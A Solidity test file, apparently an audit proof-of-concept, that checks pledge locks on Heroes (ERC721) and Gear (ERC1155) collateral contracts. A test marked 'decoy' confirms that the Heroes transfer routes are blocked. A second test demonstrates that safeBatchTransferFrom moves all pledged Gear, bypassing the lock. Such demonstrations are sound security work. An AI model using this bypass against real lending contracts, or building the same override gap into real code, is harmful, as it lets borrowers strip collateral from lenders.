// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
import {Proof} from "proof/Vm.sol";
import {Heroes, Gear} from "../src/Collateral.sol";

// Test-only children: expose minting and the lender's pledge setter, which the snippet omits.
contract TestHeroes is Heroes {
    function mint(address to, uint256 id) external { _mint(to, id); }
    function setPledged(uint256 id, bool on) external { pledged[id] = on; }
}
contract TestGear is Gear {
    function mint(address to, uint256 id, uint256 n) external { _mint(to, id, n, ""); }
    function setPledged(address a, uint256 id, uint256 n) external { pledged[a][id] = n; }
}

contract CollateralProof is Proof {
    TestHeroes heroes;
    TestGear gear;
    address borrower = address(0xB0); // an EOA, so ERC1155 needs no receiver hook
    address buyer = address(0xB1);

    function setUp() public {
        heroes = new TestHeroes();
        gear = new TestGear();
        heroes.mint(borrower, 1);
        heroes.setPledged(1, true);
        gear.mint(borrower, 7, 10);
        gear.setPledged(borrower, 7, 10);
    }

    // Decoy: Heroes overrides only transferFrom, but in OpenZeppelin 5.4.0 both safeTransferFrom
    // overloads call the public transferFrom, so every route hits the pledge check.
    function test_decoy_everyHeroRouteHitsThePledgeCheck() public {
        vm.startPrank(borrower);
        vm.expectRevert(bytes("pledged"));
        heroes.transferFrom(borrower, buyer, 1);
        vm.expectRevert(bytes("pledged"));
        heroes.safeTransferFrom(borrower, buyer, 1);
        vm.expectRevert(bytes("pledged"));
        heroes.safeTransferFrom(borrower, buyer, 1, "");
        vm.expectRevert(bytes("pledged"));
        heroes.safeTransferFrom(borrower, buyer, 1, hex"01");
        // An approved operator goes through the same function.
        heroes.setApprovalForAll(buyer, true);
        vm.stopPrank();
        vm.prank(buyer);
        vm.expectRevert(bytes("pledged"));
        heroes.safeTransferFrom(borrower, buyer, 1, "");
        assertEq(heroes.ownerOf(1), borrower, "pledged hero stayed put");
    }

    // Real cause: Gear overrides only safeTransferFrom; in OpenZeppelin 5.4.0
    // safeBatchTransferFrom goes straight to _safeBatchTransferFrom, so pledged gear moves.
    function test_loss_batchTransferMovesPledgedGear() public {
        vm.startPrank(borrower);
        vm.expectRevert(bytes("pledged"));
        gear.safeTransferFrom(borrower, buyer, 7, 1, "");

        uint256[] memory ids = new uint256[](1);
        uint256[] memory amounts = new uint256[](1);
        ids[0] = 7;
        amounts[0] = 10;
        gear.safeBatchTransferFrom(borrower, buyer, ids, amounts, "");
        vm.stopPrank();
        assertEq(gear.balanceOf(borrower, 7), 0, "borrower holds no pledged gear");
        assertEq(gear.balanceOf(buyer, 7), 10, "all ten pledged items moved");
    }
}
